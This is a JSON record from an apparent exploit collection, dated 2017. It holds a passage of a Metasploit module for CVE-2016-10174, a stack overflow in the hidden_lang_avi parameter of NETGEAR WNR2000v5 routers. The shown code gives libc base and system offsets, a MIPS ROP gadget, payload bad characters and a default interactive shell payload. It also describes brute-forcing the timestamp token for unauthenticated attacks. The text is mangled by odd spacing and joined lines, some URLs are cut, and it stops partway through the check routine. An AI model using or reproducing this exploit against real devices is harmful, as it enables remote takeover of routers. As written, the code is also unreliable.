{
    "text": "vul_name : NETGEAR WNR2000v5 ( Un ) authenticated hidden_lang_avi Stack Overflow ， vul_cve : CVE-2016-10174 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， require 'time' ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Auxiliary : CRand ， super ( update_info ( info ,  ， 'Name' => 'NETGEAR WNR2000v5 ( Un ) authenticated hidden_lang_avi Stack Overflow' ,  ， 'Description' => %q{ ， The NETGEAR WNR2000 router has a buffer overflow vulnerability in the hidden_lang_avi ， parameter. ， In order to exploit it , it is necessary to guess the value of a certain timestamp which ， is in the configuration of the router. An authenticated attacker can simply fetch this ， from a page , but an unauthenticated attacker has to brute force it. ， Bruteforcing the timestamp token might take a few minutes , a few hours , or days , but ， it is guaranteed that it can be bruteforced. ， This module implements both modes , and it works very reliably. It has been tested with ， the WNR2000v5 , firmware versions 1.0.0.34 and 1.0.0.18. It should also work with hardware ， revisions v4 and v3 , but this has not been tested - with these routers it might be necessary ， to adjust the LibcBase variable as well as the gadget addresses. ， } ,  ， 'Author' => ，  [  ， 'Pedro Ribeiro <pedrib @ gmail.com>' # Vulnerability discovery and Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， 'Platform' => [ 'unix' ]  ,  ， ' ，  [  ，  [ 'CVE' , '2016-10174' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'Targets' => ，  [  ，  [ 'NETGEAR WNR2000v5' ,  ， { ， 'LibcBase' => 0x2ab24000 ,  # should be the same offset for all firmware versions ( in libuClibc-0.9.30.1.so )  ， 'SystemOffset' => 0x547D0 ,  ， 'GadgetOffset' => 0x2462C ,  ，  # The ROP gadget will load $ sp into $ a0 ( which will contain the system (  ) command ) and call $ s0 ( which will contain the address of system (  )  :  ，  # LOAD : 0002462C addiu $ a0 ,  $ sp , 0x40+arg_0 ，  # LOAD : 00024630 move $ t9 ,  $ s0 ，  # LOAD : 00024634 jalr $ t9 ， 'Payload' => ， { ， 'BadChars' => \"\\x00\\x25\\x26\" ,  ， 'Compat' => { ， 'PayloadType' => 'cmd_interact' ,  ， 'ConnectionType' => 'find' ,  ， } ,  ， } ,  ， } ，  ]  ,  ，  ]  ,  ， 'Privileged' => true ,  ， 'Arch' => ARCH_CMD ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' } ,  ， 'DisclosureDate' => 'Dec 20 2016' ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， Opt : RPORT ( 80 )  ,  ， OptString.new ( 'HttpUsername' ,  [ true , 'Username for the web interface ( not needed but exploitation is faster ) ' , 'admin' ]  )  ,  ， OptString.new ( 'HttpPassword' ,  [ true , 'Password for the web interface ( not needed but exploitation is faster ) ' , 'password' ]  )  ,  ，  ]  , self.class )  ， register_advanced_options (  ，  [  ， OptInt.new ( 'TIME_OFFSET' ,  [ true , 'Maximum time differential to try' , 5000 ]  )  ,  ， OptInt.new ( 'TIME_SURPLUS' ,  [ true , 'Increase this if you are sure the device is vulnerable and you are not getting a shell' , 200 ]  )  ，  ]  , self.class )  ， end ， def check ， res = send_request_cgi ( { ， 'uri' => '/' ,  ， 'method' => 'GET' ， } )  ， auth = res.headers [ 'WWW-Authenticate' ] ",
    "time": "2017.03.24"
}